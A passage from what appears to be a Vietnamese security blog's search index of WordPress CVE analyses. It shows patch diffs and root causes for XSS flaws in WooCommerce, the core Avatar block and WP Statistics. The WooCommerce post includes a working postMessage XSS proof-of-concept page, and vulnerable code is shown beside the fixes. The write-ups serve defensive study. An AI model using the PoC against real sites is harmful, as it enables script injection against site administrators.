t√≠nh text ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n, lo·∫°i b·ªè XSS. ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:4:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rKh√¥ng n·ªëi chu·ªói HTML t·ª´ d·ªØ li·ªáu user r·ªìi ch√®n b·∫±ng html()/innerHTML. D√πng API t·∫°o element an to√†n (option.text, document.createElement). Lu√¥n escape/sanitize d·ªØ li·ªáu ·ªü c·∫£ server v√† client. Hi·ªÉu h√†nh vi parser: \u003cscript\u003e c√≥ th·ªÉ tho√°t kh·ªèi container inert. ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:5:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet ‚Äî PortSwigger WordPress Core \u003c= 6.8.2 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:6:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WooCommerce Plugin.","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin WooCommerce cho WordPress c√≥ l·ªó h·ªïng Cross-Site Scripting (XSS) d·ª±a tr√™n PostMessage th√¥ng qua trang ‚Äòcustomize-store‚Äô ·ªü t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 9.4.2, do vi·ªác x·ª≠ l√Ω d·ªØ li·ªáu PostMessage ch∆∞a ƒë·ªß an to√†n (kh√¥ng l·ªçc ƒë·∫ßu v√†o v√† kh√¥ng escape d·ªØ li·ªáu khi xu·∫•t ra). ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ch√®n c√°c ƒëo·∫°n script t√πy √Ω v√†o trang web, m√† s·∫Ω th·ª±c thi n·∫øu h·ªç l·ª´a ƒë∆∞·ª£c ng∆∞·ªùi d√πng th·ª±c hi·ªán m·ªôt h√†nh ƒë·ªông, v√≠ d·ª• nh∆∞ click v√†o m·ªôt li√™n k·∫øt. CVE ID: CVE-2025-5062 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 9.3.2 and from 9.4 through 9.4.2 Patched Versions: 9.3.4 and 9.4.3 CVSS severity: Low (6.1) Required Privilege: Unauthenticated Product: WordPress WooCommerce Plugin ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WooCommerce: 9.4.2 (vulnerable) v√† 9.4.3 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rTrong phi√™n b·∫£n vulnerable, attachParentListeners() l·∫Øng nghe t·∫•t c·∫£ c√°c message t·ª´ b·∫•t k·ª≥ ngu·ªìn n√†o m√† kh√¥ng ki·ªÉm tra origin, d·ªØ li·ªáu t·ª´ message ƒë∆∞·ª£c g√°n tr·ª±c ti·∫øp v√†o DOM d·∫´n ƒë·∫øn nguy c∆° PostMessage-Based XSS (sub-type c·ªßa DOM-based XSS). export function attachParentListeners() { const listener = ( event ) =\u003e { if ( event.data.type === 'navigate' ) { window.location.href = event.data.url; } }; window.addEventListener( 'message', listener, false ); return () =\u003e { window.removeEventListener( 'message', listener, false ); }; } {: file=‚Äúclient/admin/client/customize-store/utils.js v9.4.2‚Äù} Trong phi√™n b·∫£n patched, m√£ ƒë√£ b·ªï sung nhi·ªÅu l·ªõp ki·ªÉm tra v√† h·∫°n ch·∫ø so v·ªõi phi√™n b·∫£n vulnerable, chuy·ªÉn t·ª´ ‚Äúch·∫•p nh·∫≠n m·ªçi message v√† redirect th·∫≥ng‚Äù sang ‚Äúch·ªâ ch·∫•p nh·∫≠n message ƒë√°ng tin, x√°c th·ª±c c·∫•u tr√∫c v√† ki·ªÉm tra URL tr∆∞·ªõc khi ƒëi·ªÅu h∆∞·ªõng‚Äù export function attachParentListeners() { const allowedOrigins = [ getAdminSetting( 'homeUrl' ) ]; function handleMessage( event ) { // Validate the origin. if ( ! allowedOrigins.includes( event.origin ) ) { // Blocked message from untrusted origin: event.origin. return; } // Validate the structure of event.data. if ( ! event.data || typeof event.data.type !== 'string' || typeof event.data.url !== 'string' ) { // Invalid message structure: event.data. return; } // Only allow the 'navigate' type. if ( event.data.type === 'navigate' ) { // Validate the URL format. try { const url = parseAdminUrl( event.data.url ); // Further restrict navigation to trusted domains. if ( ! allowedOrigins.some( ( origin ) =\u003e url.origin === origin ) ) { throw new Error( `Blocked navigation to untrusted URL: ${ url.href }` ); } window.location.href = url.href; } catch ( error ) { // Invalid URL: event.data.url. captureException( error ); } } } window.addEventListener( 'message', handleMessage, false ); return function removeListener() { window.removeEventListener( 'message', handleMessage, false ); }; } {: file=‚Äúclient/admin/client/customize-store/utils.js v9.4.3‚Äù} Diff ‚Äî So s√°nh thay ƒë·ªïi m√£ ngu·ªìn gi·ªØa phi√™n b·∫£n vulnerable v√† b·∫£n patched ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code\rTuy ƒë√£ t√¨m ra source v√† sink, nh∆∞ng khi ph√¢n t√≠ch m√£ ngu·ªìn c·ªßa plugin sau khi upload t√¥i l·∫°i kh√¥ng t√¨m ƒë∆∞·ª£c h√†m attachParentListeners() K·∫øt qu·∫£ t√¨m ki·∫øm attachParentListeners() T√¥i nghƒ© m√¨nh ƒë√£ setup sai n√™n code kh√¥ng ƒë∆∞·ª£c t·∫£i v·ªÅ ƒë·∫ßy ƒë·ªß. Nh∆∞ng kh√¥ng, khi t√¨m v·ªõi t·ª´ kh√≥a \"navigate\" t√¥i nh·∫≠n ƒë∆∞·ª£c h√†m kh√°c t√™n c√≥ ch·ª©c nƒÉng t∆∞∆°ng t·ª± attachParentListeners() K·∫øt qu·∫£ t√¨m ki·∫øm ‚Äônavigate' üëâ Trong b·∫£n product, ƒë·ªÉ t·ªëi ∆∞u h√≥a th·ªùi gian t·∫£i d·ªØ li·ªáu v·ªÅ tr√¨nh duy·ªát, plugin ƒë√£ d√πng k·ªπ thu·∫≠t minification lo·∫°i b·ªè kho·∫£ng tr·∫Øng, ƒë·∫∑t t√™n h√†m, bi·∫øn ng·∫Øn v√† m·ªôt ph·∫ßn obfuscation l√†m cho m√£ kh√≥ ƒë·ªçc h∆°n. File ƒë∆∞·ª£c t·∫£i v·ªÅ c√≥ t√™n 5292.js ch·ª© kh√¥ng ph·∫£i utils.js. Sau khi l√†m ƒë·∫πp code, t√¥i th·∫•y 5292.js ch·ª©a m√£ c·ªßa utils.js v√† nhi·ªÅu m√£ t·ª´ c√°c file kh√°c. Truy c·∫≠p trang customize-store v√† th·ª≠ g·ª≠i postMessage b·∫±ng console c·ªßa tr√¨nh duy·ªát http://localhost/wp-admin/admin.php?page=wc-admin\u0026path=%2Fcustomize-store S·ª± ki·ªán alert() khi postMessage t·ª´ console browser üëâ alert() ƒë∆∞·ª£c k√≠ch ho·∫°t, s·ª≠ d·ª•ng debug trong tr√¨nh duy·ªát ƒë·ªÉ xem 5292.js ƒë∆∞·ª£c t·∫£i trong tr√¨nh duy·ªát 5292.js t·ª´ debug c·ªßa browser ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:3:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks\rSource: event.data t·ª´ window.postMessage (c·ª• th·ªÉ event.data.url) Sink: window.location.href = event.data.url ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:3:3","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o trang web v·ªõi m√£ ngu·ªìn sau: \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cbutton id=\"openPopup\"\u003eOpen Popup\u003c/button\u003e \u003cscript\u003e let popup; document.getElementById(\"openPopup\").addEventListener(\"click\", () =\u003e { // M·ªü popup popup = window.open( \"http://localhost/wp-admin/admin.php?page=wc-admin\u0026path=%2Fcustomize-store\", \"popupWindow\", \"width=400,height=300\" ); // Ch·ªù popup load xong const interval = setInterval(() =\u003e { if (popup \u0026\u0026 !popup.closed) { // G·ª≠i message popup.postMessage({ type: 'navigate', url: 'javascript:alert(\\\"phu0c ph4m\\\")' }, '*'); clearInterval(interval); } }, 5000); }); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Admin truy c·∫≠p trang web v√† click Open Popup Sau 5s, s·ª± ki·ªán JavaScript ƒë∆∞·ª£c k√≠ch ho·∫°t S·ª± ki·ªán JavaScript t·ª´ popup üëâ ƒê√∫ng v·ªõi m√¥ t·∫£ CVE. Popup kh√¥ng th·ªÉ t·ª± ƒë·ªông k√≠ch ho·∫°t n·∫øu kh√¥ng c√≥ t∆∞∆°ng t√°c c·ªßa ng∆∞·ªùi d√πng {: .prompt-info } ·ªû ƒë√¢y, ta kh√¥ng th·ªÉ s·ª≠ d·ª•ng \u003ciframe\u003e b·ªüi v√¨ X-Frame-Options: SAMEORIGIN ƒë∆∞·ª£c set trong response =\u003e ch·ªâ khi c√πng origin m·ªõi nh√∫ng ƒë∆∞·ª£c. X-Frame-Options: SAMEORIGIN ƒë∆∞·ª£c set trong response ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:4:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-5062 trong plugin WooCommerce \u003c= 9.4.2 l√† PostMessage-based DOM XSS. K·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c c√≥ th·ªÉ g·ª≠i message ƒë·ªôc h·∫°i t·ªõi trang customize-store, khi·∫øn tr√¨nh duy·ªát n·∫°n nh√¢n th·ª±c thi script. B·∫£n v√° 9.4.3 ƒë√£ ki·ªÉm tra origin, x√°c th·ª±c c·∫•u tr√∫c d·ªØ li·ªáu v√† whitelist URL tr∆∞·ªõc khi redirect. Key takeaways: PostMessage-based DOM XSS c√≥ th·ªÉ th·ª±c thi script khi ng∆∞·ªùi d√πng t∆∞∆°ng t√°c (popup/link). D·ªØ li·ªáu t·ª´ postMessage lu√¥n ph·∫£i coi l√† kh√¥ng tin c·∫≠y. Lu√¥n validate origin, ki·ªÉm tra c·∫•u tr√∫c d·ªØ li·ªáu v√† URL tr∆∞·ªõc khi redirect. C·∫≠p nh·∫≠t plugin l√™n b·∫£n v√° m·ªõi nh·∫•t ƒë·ªÉ ngƒÉn khai th√°c. ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet ‚Äî PortSwigger WordPress WooCommerce \u003c= 9.3.2 and from 9.4 through 9.4.2 ‚Äî CVE-2025-5062 ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:6:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Core.","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rWordPress Core d·ªÖ b·ªã Stored Cross-Site Scripting th√¥ng qua t√™n hi·ªÉn th·ªã ng∆∞·ªùi d√πng trong Avatar block ·ªü nhi·ªÅu phi√™n b·∫£n ƒë·∫øn 6.5.2 do insufficient output escaping tr√™n display name. ƒêi·ªÅu n√†y cho ph√©p authenticated attackers, c√≥ quy·ªÅn contributor-level access tr·ªü l√™n, inject arbitrary web scripts v√†o c√°c trang ‚Äî nh·ªØng script n√†y s·∫Ω th·ª±c thi m·ªói khi ng∆∞·ªùi d√πng truy c·∫≠p trang ƒë√£ b·ªã ch√®n. Ngo√†i ra, n√≥ c≈©ng cho ph√©p unauthenticated attackers inject arbitrary web scripts v√†o nh·ªØng trang c√≥ comment block v√† hi·ªÉn th·ªã comment author‚Äôs avatar. CVE ID: CVE-2024-4439 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: 6.0 - 6.0.7 6.1 - 6.1.5 6.2 - 6.2.4 6.3 - 6.3.3 6.4 - 6.4.3 6.5 - 6.5.1 Patched Versions: 6.0.8 6.1.6 6.2.5 6.3.4 6.4.4 6.5.2 CVSS severity: 7.2 (High) Required Privilege: Contributor+ Product: WordPress ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:1:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Core versions: 6.4.3 (vulnerable) v√† 6.4.4 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:2:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:3:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rTrong phi√™n b·∫£n vulnerable, WP Core ƒë√£ s·ª≠ d·ª•ng esc_attr__() ƒë·ªÉ d·ªãch chu·ªói v√† escape HTML attribute tr∆∞·ªõc khi hi·ªÉn th·ªã ra browser, nh∆∞ng ƒë√£ tri·ªÖn khai sai c√°ch. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; esc_attr__() sau khi d·ªãch chu·ªói v√† escape HTML th√¨ m·ªõi ƒë∆∞a v√†o sprintf() ƒë·ªÉ ch√®n bi·∫øn $author_name =\u003e $author_name kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω. Trong phi√™n b·∫£n patched, $author_name ƒë∆∞·ª£c ƒë∆∞a v√†o sprintf() tr∆∞·ªõc v√† sau ƒë√≥ m·ªõi ƒë∆∞·ª£c escape HTML b·∫±ng esc_attr() =\u003e an to√†n tr∆∞·ªõc XSS. $label = 'aria-label=\"' . esc_attr( sprintf( __( '(%s author archive, opens in a new tab)' ), $author_name ) ) . '\"'; So s√°nh s·ª± thay ƒë·ªïi gi·ªØa b·∫£n l·ªói v√† b·∫£n v√° ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:3:1","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable code\rfunction render_block_core_avatar( $attributes, $content, $block ) { // other logic if ( ! isset( $block-\u003econtext['commentId'] ) ) { $author_id = isset( $attributes['userId'] ) ? $attributes['userId'] : get_post_field( 'post_author', $block-\u003econtext['postId'] ); $author_name = get_the_author_meta( 'display_name', $author_id ); // other logic if ( isset( $attributes['isLink'] ) \u0026\u0026 $attributes['isLink'] ) { $label = ''; if ( '_blank' === $attributes['linkTarget'] ) { // translators: %s is the Author name. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; } } } // other logic } Avatar block l√† 1 block c·ªßa Block Editor d√πng ƒë·ªÉ t·∫°o n·ªôi dung cho post ho·∫∑c comment trong WordPress. $author_name l√† display_name c·ªßa author c√≥ $author_id thu·ªôc v·ªÅ post hi·ªán t·∫°i. N·∫øu ƒë√¢y l√† post v√† c√≥ link th√¨ $author_name ch·ª©a payload s·∫Ω th√™m v√†o attribute aria-label v√† hi·ªÉn th·ªã ra tr√¨nh duy·ªát. Khi truy c·∫≠p m·ªôt post b·∫•t k·ª≥, wp() ƒë∆∞·ª£c g·ªçi l√† l·∫•y d·ªØ li·ªáu c·ªßa post ƒë√≥. N∆°i b·∫Øt ƒë·∫ßu l·∫•y d·ªØ li·ªáu t·ª´ post hi·ªán t·∫°i function wp( $query_vars = '' ) { global $wp, $wp_query, $wp_the_query; $wp-\u003emain( $query_vars ); if ( ! isset( $wp_the_query ) ) { $wp_the_query = $wp_query; } } T·∫°i ƒë√¢y $wp_query m·ªõi ƒë∆∞·ª£c t·∫°o v√† n√≥ s·∫Ω ch·ª©a gi√° tr·ªã c·ªßa wp_post sau khi query. public function main( $query_args = '' ) { $this-\u003einit(); $parsed = $this-\u003eparse_request( $query_args ); if ( $parsed ) { $this-\u003equery_posts(); $this-\u003ehandle_404(); $this-\u003eregister_globals(); } $this-\u003esend_headers(); do_action_ref_array( 'wp', array( \u0026$this ) ); } main() s·∫Ω parse_request v√† th·ª±c hi·ªán query l·∫•y th√¥ng tin post hi·ªán t·∫°i b·∫±ng query_posts() L·∫•y th√¥ng tin post b·∫±ng query_post() $wp_the_query l√† ƒë·ªëi t∆∞·ª£ng WP_Query ch√≠nh c·ªßa WordPress, c√≤n $wp_query ch·ªâ ƒë∆°n gi·∫£n l√† m·ªôt tham chi·∫øu (reference) tr·ªè ƒë·∫øn $wp_the_query. V√¨ v·∫≠y, khi $wp_the_query ƒë√£ ƒë∆∞·ª£c kh·ªüi t·∫°o v√† c√≥ d·ªØ li·ªáu, th√¨ $wp_query c≈©ng s·∫Ω c√≥ c√πng gi√° tr·ªã. Gi√° tr·ªã tham chi·∫øu c·ªßa $wp_query Ta c√≥ ƒë∆∞·ª£c gi√° tr·ªã post_content: \u003c!-- wp:avatar {\"userId\":2,\"isLink\":true,\"linkTarget\":\"_blank\"} /--\u003e wp:avatar thu·ªôc lo·∫°i block core/avatar H√†m render() s·∫Ω g·ªçi ƒë·∫øn call_user_func() v·ªõi callback l√† render_block_core_avatar() ƒë·ªÉ l·∫•y HTML c·ªßa Avatar block r·ªìi tr·∫£ v·ªÅ cho ng∆∞·ªùi d√πng. ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:3:2","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Sources \u0026 Sinks\rSource: author name c·ªßa contributor+ Sink: $author_name ƒë∆∞·ª£c ch√®n v√†o attribute aria-label ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:3:3","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#sources--sinks"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:4:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o post account v·ªõi role contributor+ c√≥ ch·ª©a avatar block, b·∫≠t t√≠nh nƒÉng Link to user profile v√† ch·ªçn user contributor. T·∫°o post v·ªõi link to user profile ƒë∆∞·ª£c b·∫≠t Thay ƒë·ªïi firstname ch·ª©a XSS payload v√† ch·ªçn display name l√† firstname Ch·ªçn display name ch·ª©a XSS payload Admin preview post =\u003e XSS x·∫£y ra XSS x·∫£y ra khi admin truy preview post ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:4:1","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2024-4439 trong WordPress Core \u003c= 6.5.1 b·∫Øt ngu·ªìn t·ª´ vi·ªác s·ª≠ d·ª•ng sai h√†m esc_attr__() khi x·ª≠ l√Ω display_name trong Avatar block, d·∫´n ƒë·∫øn Stored XSS. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y b·∫±ng c√°ch ch√®n payload v√†o display_name, khi·∫øn script ƒë·ªôc h·∫°i th·ª±c thi khi ng∆∞·ªùi d√πng (bao g·ªìm admin) truy c·∫≠p trang ch·ª©a block. B·∫£n v√° trong 6.0.8, 6.1.6, 6.2.5, 6.3.4, 6.4.4, 6.5.2 ƒë√£ thay ƒë·ªïi c√°ch x·ª≠ l√Ω ‚Äî escape sau khi format chu·ªói b·∫±ng sprintf() ‚Äî ƒë·∫£m b·∫£o d·ªØ li·ªáu an to√†n tr∆∞·ªõc khi render ra browser. Key takeaways: Th·ª© t·ª± escape r·∫•t quan tr·ªçng: d·ªØ li·ªáu c·∫ßn ƒë∆∞·ª£c format tr∆∞·ªõc, r·ªìi m·ªõi escape ƒë·ªÉ tr√°nh l·ªçt XSS. Ngay c·∫£ core functions nh∆∞ esc_attr__() n·∫øu d√πng sai c√°ch c≈©ng c√≥ th·ªÉ m·ªü ra l·ªó h·ªïng nghi√™m tr·ªçng. Stored XSS ƒë·∫∑c bi·ªát nguy hi·ªÉm v√¨ n√≥ t·ªìn t·∫°i b·ªÅn trong database v√† ƒë∆∞·ª£c k√≠ch ho·∫°t b·∫•t k·ª≥ khi n√†o ng∆∞·ªùi d√πng truy c·∫≠p. Kh√¥ng ch·ªâ plugin/theme, m√† WordPress Core c≈©ng c·∫ßn ƒë∆∞·ª£c update th∆∞·ªùng xuy√™n ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. Vi·ªác ph√¢n t√≠ch patch diff l√† c√°ch hi·ªáu qu·∫£ ƒë·ªÉ h·ªçc c√°ch l·∫≠p tr√¨nh an to√†n v√† hi·ªÉu r√µ ngu·ªìn g·ªëc c·ªßa l·ªói. ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:5:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet ‚Äî PortSwigger WordPress Core \u003c= effected_version_here ‚Äî CVE-2024-4439 ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:6:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WP Statistics Plugin.","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rWP Statistics ‚Äì The Most Popular Privacy-Friendly Analytics Plugin cho WordPress m·∫Øc l·ªó h·ªïng Stored Cross-Site Scripting (XSS) qua User-Agent Header trong t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ tr∆∞·ªõc ƒë·∫øn 14.5.4 (bao g·ªìm c·∫£ 14.5.4). Nguy√™n nh√¢n xu·∫•t ph√°t t·ª´ vi·ªác ki·ªÉm tra v√† l·ªçc d·ªØ li·ªáu ƒë·∫ßu v√†o c≈©ng nh∆∞ tho√°t d·ªØ li·ªáu ƒë·∫ßu ra ch∆∞a ƒë·∫ßy ƒë·ªß. L·ªó h·ªïng n√†y cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ch√®n c√°c ƒëo·∫°n m√£ JavaScript ƒë·ªôc h·∫°i v√†o h·ªá th·ªëng. C√°c ƒëo·∫°n m√£ n√†y s·∫Ω ƒë∆∞·ª£c th·ª±c thi m·ªói khi ng∆∞·ªùi d√πng truy c·∫≠p v√†o trang c√≥ ch·ª©a d·ªØ li·ªáu ƒë√£ b·ªã ch√®n m√£ ƒë·ªôc, g√¢y ra nguy c∆° nghi√™m tr·ªçng cho b·∫£o m·∫≠t v√† quy·ªÅn ri√™ng t∆∞. CVE ID: CVE-2025-9816 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 14.15.4 Patched Versions: 14.15.5 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress WP Statistics Plugin ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP Statistics: v14.15.4 (vulnerable) v√† v14.15.5 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rT√¥i ƒë√£ thi·∫øu s√≥t trong qu√° tr√¨nh thu th·∫≠p th√¥ng tin v·ªÅ CVE n√†y, references c·ªßa https://www.cve.org/CVERecord?id=CVE-2025-9816 ch·ªâ r√µ n∆°i l·ªó h·ªóng x·∫£y ra: includes/admin/templates/pages/devices/models.php{: .filepath} Nh∆∞ng t√¥i ƒë√£ b·ªè qua n√≥ v√† s·ª≠ d·ª•ng Meld ƒë·ªÉ so s√°nh code. Do code thay ƒë·ªïi kh√° nhi·ªÅu n√™n t√¥i ƒë√£ ch·ªß ƒë·ªông t√¨m c√°c file li√™n quan ƒë·∫øn user-agent Diff ‚Äî so s√°nh 